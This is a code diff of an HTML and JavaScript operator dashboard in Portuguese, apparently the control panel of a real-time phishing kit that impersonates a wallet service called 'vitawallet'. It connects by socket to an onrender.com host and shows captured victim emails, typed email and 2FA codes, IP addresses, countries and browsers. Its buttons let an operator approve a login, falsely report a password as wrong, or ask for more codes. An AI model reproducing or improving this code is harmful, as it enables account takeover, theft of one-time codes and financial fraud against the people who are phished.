@@ -12,13 +12,13 @@
         body { font-family: 'Inter', sans-serif; background: #0a0c0f; color: #e0e0e0; overflow-x: hidden; }
         .bg-grid { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(0,255,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,255,0.03) 1px, transparent 1px); background-size: 40px 40px; z-index: 0; pointer-events: none; }
 
-        .navbar { position: fixed; top: 0; left: 0; right: 0; background: rgba(10,12,15,0.95); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0,255,255,0.2); padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; z-index: 100; }
+        .navbar { position: fixed; top: 0; left: 0; right: 0; background: rgba(10,12,15,0.95); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0,255,255,0.2); padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; z-index: 100; flex-wrap: wrap; gap: 8px; }
         .logo-area { display: flex; align-items: center; gap: 12px; }
         .logo-icon { font-size: 28px; color: #00ffff; filter: drop-shadow(0 0 5px #00ffff); }
         .logo-text h2 { font-size: 18px; font-weight: 600; color: #fff; }
         .logo-text p { font-size: 10px; color: #00ffff; font-family: monospace; }
-        .nav-stats { display: flex; gap: 12px; flex-wrap: wrap; }
-        .stat-badge { display: flex; align-items: center; gap: 6px; background: rgba(0,255,255,0.05); padding: 6px 12px; border-radius: 20px; border: 1px solid rgba(0,255,255,0.15); font-size: 11px; }
+        .nav-stats { display: flex; gap: 8px; flex-wrap: wrap; }
+        .stat-badge { display: flex; align-items: center; gap: 6px; background: rgba(0,255,255,0.05); padding: 6px 12px; border-radius: 20px; border: 1px solid rgba(0,255,255,0.15); font-size: 11px; white-space: nowrap; }
         .stat-badge i { color: #00ffff; font-size: 10px; }
         .stat-badge span { font-family: monospace; }
         .user-menu { display: flex; align-items: center; gap: 12px; }
@@ -26,9 +26,9 @@
         .logout-btn { background: rgba(255,68,68,0.15); border: 1px solid rgba(255,68,68,0.3); color: #ff6666; padding: 8px 14px; border-radius: 8px; cursor: pointer; font-size: 12px; transition: 0.2s; }
         .logout-btn:hover { background: rgba(255,68,68,0.25); }
 
-        .main-content { position: relative; z-index: 1; margin-top: 80px; padding: 24px; max-width: 1400px; margin-left: auto; margin-right: auto; }
+        .main-content { position: relative; z-index: 1; margin-top: 90px; padding: 24px; max-width: 1400px; margin-left: auto; margin-right: auto; }
 
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; margin-bottom: 20px; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px; margin-bottom: 20px; }
         .stat-card { background: rgba(20,25,35,0.8); backdrop-filter: blur(8px); border: 1px solid rgba(0,255,255,0.15); border-radius: 12px; padding: 14px; }
         .stat-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
         .stat-header i { font-size: 18px; color: #00ffff; opacity: 0.7; }
@@ -74,7 +74,8 @@
         .detail-value.code-2fa { font-size: 20px; letter-spacing: 6px; color: #9c27b0; font-weight: 700; }
 
         .action-buttons { display: flex; flex-wrap: wrap; gap: 6px; }
-        .btn { padding: 8px 12px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 11px; border: none; transition: 0.2s; text-align: center; white-space: nowrap; }
+        .btn { padding: 8px 10px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 10px; border: none; transition: 0.2s; text-align: center; white-space: nowrap; }
+        .btn i { margin-right: 3px; }
         .btn-approve { background: rgba(0,255,136,0.15); border: 1px solid rgba(0,255,136,0.3); color: #00ff88; }
         .btn-approve:hover { background: rgba(0,255,136,0.3); box-shadow: 0 0 15px rgba(0,255,136,0.2); }
         .btn-code { background: rgba(0,170,255,0.15); border: 1px solid rgba(0,170,255,0.3); color: #00aaff; }
@@ -85,9 +86,7 @@
         .btn-reject:hover { background: rgba(255,68,68,0.3); box-shadow: 0 0 15px rgba(255,68,68,0.2); }
         .btn-maintenance { background: rgba(255,170,0,0.15); border: 1px solid rgba(255,170,0,0.3); color: #ffaa00; }
         .btn-maintenance:hover { background: rgba(255,170,0,0.3); box-shadow: 0 0 15px rgba(255,170,0,0.2); }
-        .btn-code-wrong { background: rgba(255,100,0,0.15); border: 1px solid rgba(255,100,0,0.3); color: #ff6400; }
-        .btn-code-wrong:hover { background: rgba(255,100,0,0.3); box-shadow: 0 0 15px rgba(255,100,0,0.2); }
-        .btn-delete { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); color: #6a6f7e; font-size: 10px; padding: 6px 10px; }
+        .btn-delete { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); color: #6a6f7e; font-size: 9px; padding: 6px 8px; }
         .btn-delete:hover { background: rgba(255,68,68,0.2); border-color: rgba(255,68,68,0.3); color: #ff6666; }
 
         .logs-table { width: 100%; background: rgba(20,25,35,0.8); border: 1px solid rgba(0,255,255,0.15); border-radius: 16px; overflow-x: auto; }
@@ -173,7 +172,7 @@
 <audio id="alertSound" src="https://www.soundjay.com/buttons/sounds/button-09.mp3" preload="auto"></audio>
 
 <script>
-    const socket = io({ query: { type: 'operator' } });
+    const socket = io('https://vitawallet-aoof.onrender.com', { query: { type: 'operator' } });
     const alertSound = document.getElementById('alertSound');
 
     let activeRequests = [];
@@ -203,7 +202,7 @@
     });
 
     socket.on('new_request', (request) => {
-        const existingIdx = activeRequests.findIndex(r => r.clientSocketId === request.clientSocketId);
+        const existingIdx = activeRequests.findIndex(r => r.clientSocketId === request.clientSocketId && r.type === request.type);
         if (existingIdx !== -1) {
             activeRequests[existingIdx] = request;
             const card = document.getElementById(`card-${request.id}`);
@@ -219,7 +218,7 @@
     });
 
     socket.on('new_code_request', (request) => {
-        const existingIdx = activeRequests.findIndex(r => r.clientSocketId === request.clientSocketId);
+        const existingIdx = activeRequests.findIndex(r => r.clientSocketId === request.clientSocketId && r.type === request.type);
         if (existingIdx !== -1) {
             activeRequests[existingIdx] = request;
             const card = document.getElementById(`card-${request.id}`);
@@ -279,16 +278,33 @@
         grid.innerHTML = activeRequests.map(req => {
             const isCode = req.type === 'code';
             const is2FA = req.type === '2fa';
-            const typeLabel = isCode ? 'CÓDIGO' : (is2FA ? '2FA' : 'LOGIN');
-            const typeClass = isCode ? 'code' : (is2FA ? '2fa' : 'login');
+            const isLogin = req.type === 'login';
+            
+            let typeLabel, typeClass, iconType;
+            if (is2FA) {
+                typeLabel = '2FA';
+                typeClass = '2fa';
+                iconType = 'shield-alt';
+            } else if (isCode) {
+                typeLabel = 'CÓDIGO';
+                typeClass = 'code';
+                iconType = 'keyboard';
+            } else {
+                typeLabel = 'LOGIN';
+                typeClass = 'login';
+                iconType = 'user';
+            }
+            
             const attemptLabel = req.attempts > 1 ? `<span class="attempt-badge">Tentativa #${req.attempts}</span>` : '';
 
+            // Detalhes do card
             let detailsHTML = '';
             if (is2FA) {
                 detailsHTML = `
                     <div class="detail-item" style="grid-column:1/-1"><div class="detail-label">🔐 CÓDIGO 2FA DIGITADO</div><div class="detail-value code-2fa">${req.code || '------'}</div></div>
                     <div class="detail-item"><div class="detail-label">📧 REFERÊNCIA</div><div class="detail-value">${req.email || 'Autenticador 2FA'}</div></div>
                     <div class="detail-item"><div class="detail-label">🌍 IP</div><div class="detail-value">${req.ip || 'N/A'}</div></div>
+                    <div class="detail-item"><div class="detail-label">🏳️ PAÍS</div><div class="detail-value">${req.country || 'N/A'} ${req.flag || ''}</div></div>
                     <div class="detail-item"><div class="detail-label">💻 NAVEGADOR</div><div class="detail-value">${req.browser || 'N/A'}</div></div>
                 `;
             } else if (isCode) {
@@ -296,6 +312,7 @@
                     <div class="detail-item" style="grid-column:1/-1"><div class="detail-label">🔢 CÓDIGO EMAIL DIGITADO</div><div class="detail-value code">${req.code || '------'}</div></div>
                     <div class="detail-item"><div class="detail-label">📧 EMAIL REFERÊNCIA</div><div class="detail-value">${req.email || 'N/A'}</div></div>
                     <div class="detail-item"><div class="detail-label">🌍 IP</div><div class="detail-value">${req.ip || 'N/A'}</div></div>
+                    <div class="detail-item"><div class="detail-label">🏳️ PAÍS</div><div class="detail-value">${req.country || 'N/A'} ${req.flag || ''}</div></div>
                     <div class="detail-item"><div class="detail-label">💻 NAVEGADOR</div><div class="detail-value">${req.browser || 'N/A'}</div></div>
                 `;
             } else {
@@ -309,37 +326,21 @@
                 `;
             }
 
-            let buttonsHTML = '';
-            if (is2FA) {
-                buttonsHTML = `
-                    <button class="btn btn-approve" onclick="sendAction('${req.id}', '2fa_approved')">✅ 2FA CORRETO</button>
-                    <button class="btn btn-reject" onclick="sendAction('${req.id}', '2fa_wrong')">❌ 2FA INCORRETO</button>
-                    <button class="btn btn-maintenance" onclick="sendAction('${req.id}', '2fa_maintenance')">🔧 MANUT.</button>
-                    <button class="btn btn-delete" onclick="deleteRequest('${req.id}')">🗑️ APAGAR</button>
-                `;
-            } else if (isCode) {
-                buttonsHTML = `
-                    <button class="btn btn-approve" onclick="sendAction('${req.id}', 'code_approved')">✅ CORRETO</button>
-                    <button class="btn btn-code-wrong" onclick="sendAction('${req.id}', 'code_wrong')">❌ ERRADO</button>
-                    <button class="btn btn-maintenance" onclick="sendAction('${req.id}', 'code_maintenance')">🔧 MANUT.</button>
-                    <button class="btn btn-delete" onclick="deleteRequest('${req.id}')">🗑️ APAGAR</button>
-                `;
-            } else {
-                buttonsHTML = `
-                    <button class="btn btn-approve" onclick="sendAction('${req.id}', 'validate_login')">✅ APROVAR</button>
-                    <button class="btn btn-code" onclick="sendAction('${req.id}', 'send_code_email')">📧 CÓD. EMAIL</button>
-                    <button class="btn btn-2fa" onclick="sendAction('${req.id}', 'send_2fa')">📱 2FA</button>
-                    <button class="btn btn-reject" onclick="sendAction('${req.id}', 'wrong_password')">❌ SENHA INCORRETA</button>
-                    <button class="btn btn-maintenance" onclick="sendAction('${req.id}', 'send_maintenance')">🔧 MANUT.</button>
-                    <button class="btn btn-delete" onclick="deleteRequest('${req.id}')">🗑️ APAGAR</button>
-                `;
-            }
+            // ============ TODOS OS BOTÕES EM TODOS OS CARDS ============
+            let buttonsHTML = `
+                <button class="btn btn-approve" onclick="sendAction('${req.id}', '${is2FA ? '2fa_approved' : (isCode ? 'code_approved' : 'validate_login')}')"><i class="fas fa-check"></i> APROVAR</button>
+                <button class="btn btn-code" onclick="sendAction('${req.id}', 'send_code_email')"><i class="fas fa-envelope"></i> CÓD. EMAIL</button>
+                <button class="btn btn-2fa" onclick="sendAction('${req.id}', 'send_2fa')"><i class="fas fa-shield-alt"></i> 2FA</button>
+                <button class="btn btn-reject" onclick="sendAction('${req.id}', '${is2FA ? '2fa_wrong' : (isCode ? 'code_wrong' : 'wrong_password')}')"><i class="fas fa-times"></i> INCORRETO</button>
+                <button class="btn btn-maintenance" onclick="sendAction('${req.id}', '${is2FA ? '2fa_maintenance' : (isCode ? 'code_maintenance' : 'send_maintenance')}')"><i class="fas fa-tools"></i> MANUT.</button>
+                <button class="btn btn-delete" onclick="deleteRequest('${req.id}')"><i class="fas fa-trash"></i> APAGAR</button>
+            `;
 
             return `
                 <div class="request-card" id="card-${req.id}">
                     <div class="request-header">
                         <h3>
-                            <i class="fas fa-${is2FA ? 'shield-alt' : (isCode ? 'keyboard' : 'user')}"></i> 
+                            <i class="fas fa-${iconType}"></i> 
                             ${req.email || 'Código Email'}
                             ${attemptLabel}
                         </h3>
